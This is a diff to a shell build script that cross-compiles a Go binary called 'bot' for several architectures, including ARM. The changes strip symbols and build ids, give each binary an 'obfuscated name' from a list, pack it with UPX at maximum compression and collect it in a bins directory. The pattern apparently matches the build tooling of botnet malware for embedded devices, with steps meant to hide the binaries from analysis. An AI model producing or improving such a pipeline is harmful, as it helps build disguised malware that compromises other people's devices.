@@ -27,9 +27,9 @@ build_for_arch() {
     
     if [ -n "$goarm" ]; then
         # ARM architectures require GOARM setting
-        GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" go build -ldflags="-s -w" -o bot *.go
+        GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" go build -trimpath -ldflags="-s -w -buildid=" -o bot *.go
     else
-        GOOS="$goos" GOARCH="$goarch" go build -ldflags="-s -w" -o bot *.go
+        GOOS="$goos" GOARCH="$goarch" go build -trimpath -ldflags="-s -w -buildid=" -o bot *.go
     fi
     
     # Check if build succeeded
@@ -38,12 +38,20 @@ build_for_arch() {
         return 1
     fi
     
+    # Strip symbols (safe size reduction)
+    if command -v strip &> /dev/null; then
+        strip --strip-all bot 2>/dev/null || echo "strip failed for $arch_name"
+    fi
+
     # Rename the built binary to the obfuscated name from AMBS array
     mv bot "${AMBS[$INDEX]}"
-    # Compress the binary with UPX (use -1 for fastest/safest compression)
-    # Note: --best --lzma can corrupt Go static binaries on some systems
+
+    # Compress the binary with UPX (fast aggressive compression)
+    # Using --best --lzma for good compression without ultra-brute slowness
     if command -v upx &> /dev/null; then
-        upx -1 "${AMBS[$INDEX]}" 2>/dev/null || echo "UPX compression skipped for $arch_name"
+        upx --best --lzma "${AMBS[$INDEX]}" 2>/dev/null || \
+        upx -9 "${AMBS[$INDEX]}" 2>/dev/null || \
+        echo "UPX compression skipped for $arch_name"
     fi
     # Move to bins directory
     mv "${AMBS[$INDEX]}" "$BINS_DIR/"
